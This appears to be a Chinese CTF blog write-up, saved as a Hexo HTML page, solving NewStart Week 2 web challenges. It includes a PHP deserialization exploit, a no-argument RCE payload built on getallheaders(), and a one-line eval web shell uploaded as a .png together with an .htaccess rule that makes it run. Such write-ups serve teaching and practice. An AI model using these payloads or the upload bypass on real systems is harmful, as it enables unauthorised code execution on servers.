@@ -1,0 +1,230 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Dragonkeep | Dragonkeep</title><meta name="author" content="Dragonkeep"><meta name="copyright" content="Dragonkeep"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="NewStart WEEK2 WEB游戏高手控制台修改gameScore参数值，然后挂掉就行。  ez_sqlSQLmap直接出  Unserialize？反序列化，只要注意它是私有属性就行 exp: 12345678910<?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserializ">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Dragonkeep">
+<meta property="og:url" content="http://dragonkeeep.top/category/NewStart%20WEEK2%20WEB/index.html">
+<meta property="og:site_name" content="Dragonkeep">
+<meta property="og:description" content="NewStart WEEK2 WEB游戏高手控制台修改gameScore参数值，然后挂掉就行。  ez_sqlSQLmap直接出  Unserialize？反序列化，只要注意它是私有属性就行 exp: 12345678910<?phphighlight_file(__FILE__);// Maybe you need learn some knowledge about deserializ">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://dragonkeeep.top/img/Pic.jpg">
+<meta property="article:published_time" content="2023-10-16T04:37:47.218Z">
+<meta property="article:modified_time" content="2023-10-16T04:41:44.948Z">
+<meta property="article:author" content="Dragonkeep">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dragonkeeep.top/img/Pic.jpg"><link rel="shortcut icon" href="/img/Pic.jpg"><link rel="canonical" href="http://dragonkeeep.top/category/NewStart%20WEEK2%20WEB/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="//busuanzi.ibruce.info"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Dragonkeep',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-10-16 12:41:44'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/modify.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/Pic.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/background.jpeg')"><nav id="nav"><span id="blog-info"><a href="/" title="Dragonkeep"><span class="site-name">Dragonkeep</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">无题</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-10-16T04:37:47.218Z" title="发表于 2023-10-16 12:37:47">2023-10-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-10-16T04:41:44.948Z" title="更新于 2023-10-16 12:41:44">2023-10-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><div class="top-img" style="background-image: url('/img/background.jpeg');"></div><article class="post-content" id="article-container"><h1 id="NewStart-WEEK2-WEB"><a href="#NewStart-WEEK2-WEB" class="headerlink" title="NewStart WEEK2 WEB"></a>NewStart WEEK2 WEB</h1><h2 id="游戏高手"><a href="#游戏高手" class="headerlink" title="游戏高手"></a>游戏高手</h2><p>控制台修改gameScore参数值，然后挂掉就行。</p>
+<p><img src="/pic/image-20231008212646040.png" alt="image-20231008212646040"></p>
+<h4 id="ez-sql"><a href="#ez-sql" class="headerlink" title="ez_sql"></a>ez_sql</h4><p>SQLmap直接出</p>
+<p><img src="/pic/image-20231008212757181.png" alt="image-20231008212757181"></p>
+<h4 id="Unserialize？"><a href="#Unserialize？" class="headerlink" title="Unserialize？"></a>Unserialize？</h4><p>反序列化，只要注意它是私有属性就行</p>
+<p>exp:</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="comment">// Maybe you need learn some knowledge about deserialize?</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span></span><br><span class="line"><span class="class"></span>{</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$cmd</span>=<span class="string">"nl /th1s_1s_fffflllll4444aaaggggg"</span>;</span><br><span class="line">}</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">evil</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/image-20231008222629661.png" alt="image-20231008222629661"></p>
+<h4 id="R-C-E"><a href="#R-C-E" class="headerlink" title="R!!C!!E!!"></a>R!!C!!E!!</h4><p>题目提示要扫，那就扫！！！</p>
+<p>dirsearch启动</p>
+<p><img src="/pic/image-20231008223854603.png" alt="image-20231008223854603"></p>
+<p>扫出来发现<code>.git</code>无法直接访问，但是可以访问它目录下的其他文件，</p>
+<p>在<code>.git/COMMIT_EDITMSG</code>目录下发现<code> bo0g1pop.php</code></p>
+<p>源码</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="string">';'</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, <span class="variable">$_GET</span>[<span class="string">'star'</span>])) {</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">'/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i'</span>,<span class="variable">$_GET</span>[<span class="string">'star'</span>])){</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">'star'</span>]);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>看到<code>';' === preg_replace('/[^\W]+\((?R)?\)/'</code>这个经典正则，就知道考点是<strong>无参数读取文件</strong>。</p>
+<p>ban掉了<code>scandir</code>，考虑<code>getallheaders()</code></p>
+<p>用<code>print_r</code>代替<code>var_dump</code></p>
+<p>先查看一下getallheaders()数组下可控的http头。</p>
+<blockquote>
+<p>?star=print_r(getallheaders());</p>
+</blockquote>
+<p><img src="/pic/image-20231010220620310.png" alt="image-20231010220620310"></p>
+<p>这里<code>current</code>被ban了，用pos替代</p>
+<p><img src="/pic/image-20231010220725892.png" alt="image-20231010220725892"></p>
+<p>虽然host可控，但是修改了就实例报错。。。。</p>
+<p>但是ua头可以随便修改，所以用next</p>
+<blockquote>
+<p><img src="/pic/image-20231010221240463.png" alt="image-20231010221240463"></p>
+</blockquote>
+<h4 id="Upload-again"><a href="#Upload-again" class="headerlink" title="Upload again!"></a>Upload again!</h4><p>经测试发现，上传内容中对<code>&lt;?php</code>标签过滤了，采用长标签解析绕过。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language='php'&gt;@eval($_GET['a'])&lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>
+
+<p>改后缀为png</p>
+<p>再上传.htaccess文件，对png文件进行解析。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></tbody></table></figure>
+
+<p>再访问<code>upload/xxx.png</code>，就可以执行php代码了。</p>
+<p><img src="/pic/image-20231016011954726.png" alt="image-20231016011954726"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://dragonkeeep.top">Dragonkeep</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://dragonkeeep.top/category/NewStart%20WEEK2%20WEB/">http://dragonkeeep.top/category/NewStart%20WEEK2%20WEB/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://dragonkeeep.top" target="_blank">Dragonkeep</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/Pic.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/category/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/" title="PHP原生类的利用"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">PHP原生类的利用</div></div></a></div></nav><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/Pic.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"></div><div class="author-info__name">Dragonkeep</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/dragonkeep/dragonkeep.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Welcome to my Blog!!!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NewStart-WEEK2-WEB"><span class="toc-number">1.</span> <span class="toc-text">NewStart WEEK2 WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%B8%E6%88%8F%E9%AB%98%E6%89%8B"><span class="toc-number">1.1.</span> <span class="toc-text">游戏高手</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ez-sql"><span class="toc-number">1.1.0.1.</span> <span class="toc-text">ez_sql</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Unserialize%EF%BC%9F"><span class="toc-number">1.1.0.2.</span> <span class="toc-text">Unserialize？</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#R-C-E"><span class="toc-number">1.1.0.3.</span> <span class="toc-text">R!!C!!E!!</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Upload-again"><span class="toc-number">1.1.0.4.</span> <span class="toc-text">Upload again!</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/category/NewStart%20WEEK2%20WEB/" title="无题">无题</a><time datetime="2023-10-16T04:37:47.218Z" title="发表于 2023-10-16 12:37:47">2023-10-16</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/category/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/" title="PHP原生类的利用">PHP原生类的利用</a><time datetime="2023-09-08T05:24:16.500Z" title="发表于 2023-09-08 13:24:16">2023-09-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/category/%E7%BE%8A%E5%9F%8E%E6%9D%AFSerpent/" title="羊城杯Serpent">羊城杯Serpent</a><time datetime="2023-09-03T02:40:04.514Z" title="发表于 2023-09-03 10:40:04">2023-09-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/category/Java%E5%8F%8D%E5%B0%84%E5%AD%A6%E4%B9%A0/" title="Java反射学习">Java反射学习</a><time datetime="2023-08-28T17:17:51.304Z" title="发表于 2023-08-29 01:17:51">2023-08-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/category/%E5%AD%A6%E4%B9%A0Quino%E6%B3%A8%E5%85%A5/" title="学习Quino注入">学习Quino注入</a><time datetime="2023-08-23T18:00:03.601Z" title="发表于 2023-08-24 02:00:03">2023-08-24</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent"><div id="footer-wrap"><div class="copyright">©2020 - 2023 By Dragonkeep</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'GFZPevO0zWLELDi0dvw4FOkP-gzGzoHsz',
+      appKey: 'YIDOusH5DcKlmrmKtWhMUhUU',
+      avatar: 'monsterid',
+      serverURLs: 'https://gfzpevo0.lc-cn-n1-shared.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
